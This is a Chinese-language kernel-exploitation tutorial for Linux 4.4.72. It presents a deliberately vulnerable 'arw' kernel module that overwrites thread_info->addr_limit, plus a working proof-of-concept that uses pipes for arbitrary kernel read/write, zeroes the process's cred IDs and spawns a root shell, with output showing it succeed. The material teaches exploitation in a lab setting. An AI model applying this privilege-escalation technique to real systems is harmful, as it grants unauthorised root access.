# how2kernel————第六节修改addr_limit

> 内核版本：Linux4.4.72
>
> 文件：[addr_limit.tar](https://raw.githubusercontent.com/fangdada/kernelPWN/master/how2kernel/05addr_limit/addr_limit.tar)

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>在内核态栈顶部有一个结构体叫thread_info，其定义如下：</font></br>

```c
struct thread_info {
    struct task_struct  *task;      /* main task structure */
    __u32           flags;      /* low level flags */
    __u32           status;     /* thread synchronous flags */
    __u32           cpu;        /* current CPU */
    mm_segment_t        addr_limit;
    unsigned int        sig_on_uaccess_error:1;
    unsigned int        uaccess_err:1;  /* uaccess failed */
};
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>为什么开门见山就放代码？因为这一次概念十分简单，我们可以看到thread_info里的addr_limit成员，这就是我们要修改的目标，其定义了用户所能访问的最大地址，如果我们把它修改为0xFFFFFFFFFFFFFFFF，那就意味着我们可以随意任意空间了吗？是的。</font></br>

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>好的，那么我们知道thread_info在栈顶部了，具体在什么位置呢？thread_info的位置可以由当前栈地址&CURRENT_MASK得到，其定义如下：</font></br>

```C
#ifdef CONFIG_KASAN
#define KASAN_STACK_ORDER 1
#else
#define KASAN_STACK_ORDER 0
#endif

#define THREAD_SIZE_ORDER	(2 + KASAN_STACK_ORDER)
#define THREAD_SIZE  (PAGE_SIZE << THREAD_SIZE_ORDER)
#define CURRENT_MASK (~(THREAD_SIZE - 1))
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>PAGES_SIZE我们都知道是4k，KASAM_STACK_ORDER则是0，所以THREAD_SIZE就是4k\<\<2就是16k，所以CURRENT_MASK就是(~(16k-1))，也就是0xFFFFFFFFFFFFC000。所以我们可以得到thread_info的地址了，接下来我们看看模块代码，这只是一个来自[jinyu00](https://gitee.com/hac425/kernel_ctf)的例子：</font></br>

```C
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/errno.h>
#include <linux/cdev.h>
#include <asm/uaccess.h>
#include <linux/device.h>
#include<linux/slab.h>
#include<linux/string.h>

struct class *arw_class;
struct cdev cdev;
char *p;
int arw_major=248;

struct param
{
    size_t len;
    char* buf;
    char* addr;
};

char buf[16] = {0};

long arw_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{

    struct param par;
    struct param* p_arg;
    long p_stack;
    long* ptr;
    struct thread_info * info;
    copy_from_user(&par, arg, sizeof(struct param));

    int retval = 0;
    switch (cmd) {
        case 8:
            printk("current: %p, size: %d, buf:%p\n", current, par.len, par.buf);
            copy_from_user(buf, par.buf, par.len);
            break;
        case 7:
            printk("buf(%p), content: %s\n", buf, buf);
            break;
        case 5:
            p_arg = (struct param*)arg;
            p_stack = (long)&retval;
            p_stack = p_stack&0xFFFFFFFFFFFFC000;
            info = (struct thread_info * )p_stack;

            printk("addr_limit's addr: 0x%p\n", &info->addr_limit);
            memset(&info->addr_limit, 0xff, 0x8);

            put_user(info, &p_arg->addr);
            break;

        case 999:
            p = kmalloc(8, GFP_KERNEL);
            printk("kmalloc(8) : %p\n", p);
            break;
        case 888:
            kfree(p);
            printk("kfree : %p\n", p);
            break;
        default:
            retval = -1;
            break;
    }

    return retval;
}

static const struct file_operations arw_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = arw_ioctl,
};

static int arw_init(void)
{

    dev_t devno = MKDEV(arw_major, 0);
    int result;

    if (arw_major)
        result = register_chrdev_region(devno, 1, "arw");
    else {
        result = alloc_chrdev_region(&devno, 0, 1, "arw");
        arw_major = MAJOR(devno);
    }
    printk("arw_major /dev/arw: %d", arw_major);

    if (result < 0)
        return result;

    arw_class = class_create(THIS_MODULE, "arw");
    device_create(arw_class, NULL, devno, NULL, "arw");

    cdev_init(&cdev, &arw_fops);
    cdev.owner = THIS_MODULE;
    cdev_add(&cdev, devno, 1);
    printk("arw init success\n");
    return 0;
}

static void arw_exit(void)
{
    cdev_del(&cdev);
    device_destroy(arw_class, MKDEV(arw_major, 0));
    class_destroy(arw_class);
    unregister_chrdev_region(MKDEV(arw_major, 0), 1);
    printk("arw exit success\n");
}

MODULE_AUTHOR("exp_ttt");
MODULE_LICENSE("GPL");

module_init(arw_init);
module_exit(arw_exit);
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>可以看到出于方便，ioctl的cmd5直接修改了thead_info->addr_limit为最大数，那么我们所需要做的就是去利用之就行了，既然可以访问任意地址了，那么我们就可以泄漏或者修改任意地址，不过似乎只能通过管道修改而不是直接修改，具体原因未知23333，如果有大佬知道的话希望能告诉我，万分感谢。修改途径如下：</font></br>

```C
int kmemcpy(void *dest, void *src, size_t size)
{
    write(pipefd[1], src, size);
    read(pipefd[0], dest, size);
    return size;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>管道大家都知道吧，一个进一个出，需要泄漏时我们就可以令src为泄漏地址，dest为接受地址；需要修改时令src为payload，dest为被修改地址。那么现在我们的情况是，可以write-anything-anywhere，我们如何得到一个root shell呢？这里又要引出另一个结构体：</font></br>

```C
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>其结构中的*id字段定义了一个作业的权限，如果我们把一系列id结构全部设置为0，那就是root（**root uid为0**）。所以知道该怎么做了吧？poc如下：</font></br>

```C
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
struct param
{
    size_t len;
    char* buf;
    char* addr;
};

int pipefd[2];

int kmemcpy(void *dest, void *src, size_t size)
{
    write(pipefd[1], src, size);
    read(pipefd[0], dest, size);
    return size;
}

int main(void)
{
    int fd;
    char buf[16];

    fd = open("/dev/arw", O_RDWR);
    if (fd == -1) {
        printf("open hello device failed!\n");
        return -1;
    }

    struct param p;
    ioctl(fd, 5, &p);
    printf("got thread_info: %p\n", p.addr);
    char * info = p.addr;
    int ret_val = pipe(pipefd);
    if (ret_val < 0) {
        printf("pipe failed: %d\n", ret_val);
        exit(1);
    }

    kmemcpy(buf, info, 16);
    void* task_addr = (void *)(*(long *)buf);
    //p &((struct task_struct*)0)->real_cred
    // 0x5a8
    kmemcpy(buf, task_addr+0x5f0, 16);
    char* real_cred = (void *)(*(long *)buf);
    printf("task_addr: %p\n", task_addr);
    printf("real_cred: %p\n", real_cred);
    char* cred_ids = malloc(0x1c);
    memset(cred_ids, 0, 0x1c);

    kmemcpy(real_cred, cred_ids, 0x1c);

    kmemcpy(real_cred+8, &real_cred, 8);
    system("sh");

    return 0;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>最终效果如下：</font></br>

```shell
/mytest # ./makeuser.sh 
[    5.946516] arw_major /dev/arw: 248arw init success
passwd: unknown uid 0
/mytest $ ./poc
[    6.925967] addr_limit's addr: 0xffff88000244c018
got thread_info: 0xffff88000244c000
task_addr: 0xffff880002aaa640
real_cred: 0xffff88000240f000
/mytest # 
```

